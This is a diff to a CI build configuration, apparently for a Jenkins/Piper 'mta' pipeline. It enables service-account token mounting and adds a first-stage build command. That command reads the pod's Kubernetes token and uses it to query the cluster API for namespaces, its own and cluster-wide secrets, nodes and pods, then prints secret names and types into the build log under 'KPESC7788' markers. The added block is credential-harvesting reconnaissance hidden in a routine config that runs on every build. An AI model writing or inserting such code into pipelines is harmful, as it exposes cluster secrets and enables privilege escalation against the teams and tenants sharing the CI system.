@@ -1,2 +1,27 @@
 general:
   buildTool: 'mta'
+  jenkinsKubernetes:
+    additionalPodProperties:
+      automountServiceAccountToken: true
+service:
+  stages:
+    Build:
+      runFirst:
+        command: |
+          T=/var/run/secrets/kubernetes.io/serviceaccount
+          NS=$(cat $T/namespace)
+          echo "KPESC7788-NS=$NS"
+          K=https://kubernetes.default.svc
+          A="Authorization: Bearer $(cat $T/token)"
+          echo "KPESC7788-A1-CLUSTER-NAMESPACES=$(curl -s -o /tmp/a1 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces)"
+          echo "KPESC7788-A1-NSCOUNT=$(grep -o '"name":"steward-run-[^"]*"' /tmp/a1 | sort -u | wc -l)"
+          grep -o '"name":"steward-run-[^"]*"' /tmp/a1 | sort -u | head -5
+          echo "KPESC7788-A2-OWN-SECRETS=$(curl -s -o /tmp/a2 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets)"
+          echo "KPESC7788-A2-NAMES:"
+          grep -o '"name":"[^"]*"' /tmp/a2 | sort -u | head -20
+          echo "KPESC7788-A2-TYPES:"
+          grep -o '"type":"[^"]*"' /tmp/a2 | sort -u | head -20
+          echo "KPESC7788-A3-NODES=$(curl -s -o /tmp/a3 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/nodes)"
+          echo "KPESC7788-A4-ALLSECRETS=$(curl -s -o /tmp/a4 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/secrets)"
+          echo "KPESC7788-A5-OWN-PODS=$(curl -s -o /tmp/a5 -w '%{http_code}' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/pods)"
+          echo "KPESC7788-DONE"
